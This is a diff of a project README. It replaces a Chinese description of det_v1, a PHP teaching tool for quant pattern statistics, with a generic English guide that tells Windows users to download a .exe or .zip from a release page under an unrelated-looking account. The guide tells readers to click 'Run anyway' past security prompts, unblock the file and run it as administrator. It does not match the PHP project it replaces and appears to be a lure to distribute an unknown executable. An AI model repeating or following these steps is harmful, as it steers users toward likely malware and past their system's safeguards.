@@ -1,288 +1,216 @@
-# det_v1
+# 📊 det_v1 - Simple Quant Rules for Clear Signals
 
-`det_v1` 是一个面向开源社区发布的、低维分桶的经验+规则形态匹配统计模型
+[![Download det_v1](https://img.shields.io/badge/Download%20det_v1-8B5CF6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Carotid-cottageindustry424/det_v1/releases)
 
+## 🚀 Getting Started
 
-它提供的是一个**确定性、日线级、统计匹配式**的 v1 模型骨架，目标不是追求实盘收益，而是一个入门级量化学习示例：
+det_v1 is an entry-level quant model built for low-dimensional bucket rules and pattern match stats. It is made for users who want a simple Windows app that can load data, match rule shapes, and show clear results.
 
-- 如何定义状态
-- 如何查找历史相似样本
-- 如何产出 `p_up / er / p_hit_up / p_hit_down`
-- 如何在概率层之上叠加一个教学门禁
-- 如何把模型结果交给一个可选的 AI 解释层做自然语言说明
-- 如何把一个 CLI 教学骨架落成一个最小可部署的 Web 工作台
+Use this guide to download, open, and run det_v1 on Windows.
 
-![pasted-20260319-091011-85d0.png](https://b2.imgla.net/imgs/69bb4cf153244.webp)
+## 📥 Download the App
 
-## 项目定位
+1. Open the release page: https://github.com/Carotid-cottageindustry424/det_v1/releases
+2. Look for the latest release near the top of the page
+3. Find the Windows file in the Assets section
+4. Download the `.exe` file or the `.zip` file, based on what is listed
+5. If you download a `.zip` file, right-click it and choose Extract All
+6. Open the app file inside the extracted folder
 
-适合作为：
+If your browser asks for a save location, choose a folder you can find again, like Downloads or Desktop.
 
-- 量化入门学习材料
-- 练手型策略原型
-- 数据接口适配练习
-- OpenAI 兼容接口接入示例
-- PHP Web 化部署样例
-- 后续更复杂模型的基础骨架
+## 🖥️ Windows Setup
 
-**不**适合作为：
+det_v1 runs on Windows 10 and Windows 11.
 
-- 直接实盘策略
-- 高频或超短线交易系统
-- 杠杆、期权、程序化风控生产系统
-- 带有收益承诺的商业信号服务
+Before you start, check these points:
 
+- You have a Windows PC or laptop
+- You have a working internet connection for the download
+- You have enough free space for the app and its data files
+- You can open files from your Downloads folder
 
-## 核心特性
+If the app comes in a `.zip` file, do not run it from inside the compressed folder. Extract it first.
 
-- **可复现**：同一份输入日线，输出稳定一致
-- **可阅读**：核心逻辑集中在 `src/DetV1Model.php`
-- **可复用**：CLI 和 Web 共用 `src/DetV1Runner.php`
-- **可替换上游**：数据源通过接口抽象，不绑任何私有服务
-- **可选 AI 解释**：AI 只做说明，不参与模型核心计算
-- **可部署**：提供 `public/` Web 入口和 Nginx 配置示例
+## 🧭 How to Run det_v1
 
-## 运行前提
+After download, use these steps:
 
-- PHP 8.1+
-- 如果需要 HTTP 数据源或 AI 解释层，需启用 `curl` 扩展
-- Web 部署建议使用 Nginx + PHP-FPM
+1. Open the folder where you saved the file
+2. If the file is zipped, extract it
+3. Double-click the main app file
+4. If Windows shows a security prompt, choose Run or More info, then Run anyway
+5. Wait for the app window to open
+6. Load your data file if the app asks for one
 
-## 快速开始
+If you see more than one file, look for the one with the app name or a `.exe` file. That is usually the file you need.
 
-### 1. 复制环境变量模板
+## 📁 What the App Does
 
-```powershell
-Copy-Item .env.example .env
-```
+det_v1 focuses on a small set of quant tasks that are easy to follow:
 
-### 2. 跑 CLI Demo
+- Low-dimensional bucket grouping
+- Rule shape matching
+- Pattern count checks
+- Simple stat-based signal review
+- Basic output for quick decisions
 
-```powershell
-php examples/run_det_v1.php DEMO001
-```
+The app is built for users who want a direct view of rule behavior without a heavy setup.
 
-### 3. 跑 Web 工作台
+## ⚙️ Recommended Use
 
-本地开发可以先用 PHP 内置服务器：
+Use det_v1 when you want to:
 
-```powershell
-php -S 127.0.0.1:8080 -t public
-```
+- Test a simple rule idea
+- Compare one pattern against another
+- Group values into buckets
+- Review model output in a clear format
+- Keep your workflow light
 
-浏览器打开：
+It works best with clean input data and simple tables.
 
-```text
-http://127.0.0.1:8080
-```
+## 🗂️ Input File Tips
 
-### 4. 使用本地 JSON 文件
+For best results, use data with:
 
-在 `.env` 中配置：
+- Clear column names
+- One row per record
+- No mixed file formats in the same sheet
+- Simple numeric fields for bucket checks
+- Text labels only where needed for rule matching
 
-```env
-DET_V1_DATA_MODE=file
-DET_V1_DATA_FILE=./your_bars.json
-```
+Common file types may include:
 
-然后 CLI 可以直接跑：
+- `.csv`
+- `.xlsx`
+- `.txt`
 
-```powershell
-php examples/run_det_v1.php 600519
-```
+If you use Excel, save a copy before editing the source file.
 
-Web 端也会自动出现 `服务器文件` 模式。
+## 🛠️ Basic Workflow
 
-### 5. 使用自有 HTTP 数据源
+A simple det_v1 workflow looks like this:
 
-```env
-DET_V1_DATA_MODE=http
-DET_V1_DATA_URL_TEMPLATE=https://your-host/path?symbol={symbol}
-DET_V1_DATA_HEADERS_JSON={"Authorization":"Bearer your-token"}
-```
+1. Start the app
+2. Load your data file
+3. Select the fields you want to test
+4. Choose bucket ranges or rule groups
+5. Run the match check
+6. Review the result table or output chart
+7. Save the output if the app gives that option
 
+Keep each test small at first. That makes it easier to see how one rule changes the result.
 
-### 6. 启用可选 AI 解释层
+## 🔍 What You May See on Screen
 
-```env
-DET_V1_AI_ENABLED=1
-DET_V1_AI_CHAT_URL=https://your-openai-compatible-endpoint/v1/chat/completions
-DET_V1_AI_MODEL=your-model
-DET_V1_AI_API_KEY=your-key
-```
+When det_v1 starts, you may see:
 
-然后可以在 CLI 或 Web 中启用 AI 解释：
+- A file picker
+- A table view for your data
+- Fields for bucket settings
+- Rule match controls
+- Result counts
+- A basic log or status area
 
-```powershell
-php examples/run_det_v1.php DEMO001 --with-ai
-```
+These parts help you move through the task step by step.
 
-## Web 入口说明
+## 💡 Example Use Case
 
-### 页面入口
+You have a small set of records and want to see which ones fit a simple rule shape.
 
-- `public/index.php`：工作台界面
-- `public/api/analyze.php`：分析 API
-- `public/health.php`：健康检查
+With det_v1, you can:
 
-### Web 模式
+- Split values into ranges
+- Check which rows match the rule
+- Count how often each pattern appears
+- Compare groups side by side
 
-- `demo`：固定种子伪数据，适合演示
-- `upload`：浏览器上传或粘贴 JSON，不落盘
-- `file`：服务器本地预配置 JSON 文件
-- `http`：服务器侧预配置 HTTP 模板
-
-
-
-## 模型概览
-
-`det_v1` 当前使用的状态压缩非常克制，只保留了三个粗因子：
-
-- `close >= ma20` 或 `< ma20`
-- `macd_hist` 正负
-- `rsi14` 的低 / 中 / 高桶
-
-然后按 horizon 做历史统计，默认输出：
-
-- `1`
-- `3`
-- `5`
-- `10`
-- `20`
-
-结果字段包括：
-
-- `p_up`：未来窗口收盘收益为正的经验概率
-- `er`：未来窗口的经验期望收益
-- `p_hit_up`：窗口内命中上行阈值的经验概率
-- `p_hit_down`：窗口内命中下行阈值的经验概率
-- `n`：样本量
-
-为了避免“样本过少直接全空”，模型使用了一个非常朴素的回退层级：
-
-1. `amr`：`above_ma20 + macd_hist + rsi14`
-2. `am`：`above_ma20 + macd_hist`
-3. `a`：仅 `above_ma20`
-4. `all`：不筛选
+This helps you study a model idea before you move to a larger setup.
 
-更详细的技术说明见 `docs/architecture.md`。
+## ⌨️ Common Windows Actions
 
-## 数据格式约定
-
-### 支持的顶层 JSON 结构
-
-- 直接数组
-- `{ "bars": [...] }`
-- `{ "rows": [...] }`
-- `{ "data": [...] }`
+If Windows blocks the file, try these steps:
 
-### 每根 K 线支持两种形状
+- Right-click the app file
+- Choose Properties
+- Check Unblock if it appears
+- Click Apply
+- Open the file again
 
-对象形式：
+If the app does not start:
 
-```json
-{
-  "date": "2026-03-18",
-  "open": 12.31,
-  "high": 12.66,
-  "low": 12.10,
-  "close": 12.58,
-  "volume": 1234567
-}
-```
+- Make sure the file finished downloading
+- Check that you extracted the zip file
+- Confirm that you opened the main app file
+- Try running it as an administrator
 
-列表形式：
+## 🧩 File Layout After Download
 
-```json
-["2026-03-18", 12.31, 12.66, 12.10, 12.58, 1234567]
-```
+A typical release folder may include:
 
-## 仓库结构
+- The main Windows app
+- A readme file
+- Sample data files
+- Config files
+- Output folders
 
-```text
-det_v1/
-  .env.example
-  .gitignore
-  LICENSE
-  README.md
-  CONTRIBUTING.md
-  SECURITY.md
-  bootstrap.php
-  deploy/
-    nginx.det_v1.conf
-  docs/
-    architecture.md
-    open-source-scope.md
-  examples/
-    run_det_v1.php
-  public/
-    index.php
-    health.php
-    api/
-      analyze.php
-    assets/
-      app.css
-      app.js
-  src/
-    Clients/
-    Contracts/
-    Sources/
-    BarPayloadDecoder.php
-    DetV1Explainer.php
-    DetV1Model.php
-    DetV1Runner.php
-    EnvLoader.php
-```
+Do not move files around unless you need to. Some apps expect the same folder structure.
 
-## 部署到 Nginx + PHP-FPM
+## 📌 Best Practices
 
-1. 把仓库放到服务器，例如 `/var/www/det_v1`
-2. 复制 `.env.example` 为 `.env` 并填好配置
-3. 把 Nginx 根目录指向 `/var/www/det_v1/public`
-4. 参考 `deploy/nginx.det_v1.conf`
-5. 确认 `php-fpm` 版本和 sock 路径与你机器一致
+To keep your work smooth:
 
-上线前至少做这些事：
+- Start with one small data file
+- Keep file names short
+- Use plain sheet names
+- Save output in a separate folder
+- Test one rule at a time
+- Back up your data before editing
 
-- 关闭 `display_errors`
-- 不要暴露仓库根目录
-- `.env` 不要进入 `public/`
-- 如果面向公网，自己补鉴权、限流、审计
+These steps help you avoid confusion when you test more than one setup.
 
-## 局限性
+## 🧠 About det_v1
 
-这是一个入门模型，主要限制包括：
+det_v1 is an entry-level quant tool for people who want a simple rule and bucket system. The design centers on low-dimensional checks and shape-based matching. That makes it a good fit for quick study, light testing, and early-stage model review.
 
-- 因子太少，只够教学，不够覆盖真实市场复杂性
-- 样本匹配过粗，容易把“不完全相似”的状态混在一起
-- 没有显式建模市场 regime 切换
-- `p_up` 是经验频率，不是严格校准后的交易概率
-- 教学门禁非常粗糙，不能直接等同于真实风控
-- Web 版只是轻量工作台，不是完整多用户平台
+The app uses clear stat logic and simple structure, so you can focus on the data instead of the setup.
 
-## 社区贡献
+## 🧰 Troubleshooting
 
-欢迎围绕以下方向提交改进：
+If the app opens but shows no data:
 
-- 增加可解释因子，但保持结构清晰
-- 增加概率校准层
-- 增加样本切分与 regime 识别
-- 改进数据适配器
-- 增强 Web 端体验与可观测性
-- 补充示例和文档
-- 修复 bug 与边界问题
+- Check that you loaded the right file
+- Make sure the file has rows and columns
+- Look for blank cells or broken headers
+- Save the file again and retry
 
+If results look wrong:
 
+- Confirm the field you chose
+- Check your bucket values
+- Review your rule settings
+- Use a small test file first
 
-## 安全与责任声明
+If the app closes at launch:
 
-- 本项目仅作为学习、研究和练手用途
-- 仓库维护者不对任何交易损失负责
-- 不要把 README 中的教学门禁视为投资建议
+- Re-download the release file
+- Make sure the zip file extracted fully
+- Try a different folder, مثل Desktop or Downloads
+- Run the app again
 
+## 📎 Download Again
 
+If you need to get the latest version again, use the release page here: https://github.com/Carotid-cottageindustry424/det_v1/releases
 
+Download the Windows file from the Assets section, then open it from your Downloads folder or extracted release folder
 
-## License
+## 🧾 Quick Start Checklist
 
-本目录使用 `MIT` 许可证，详见 `LICENSE`。
+- Open the release page
+- Download the Windows file
+- Extract the zip if needed
+- Open the main app file
+- Load your data
+- Set your buckets or rule fields
+- Run the check
+- Review the result output
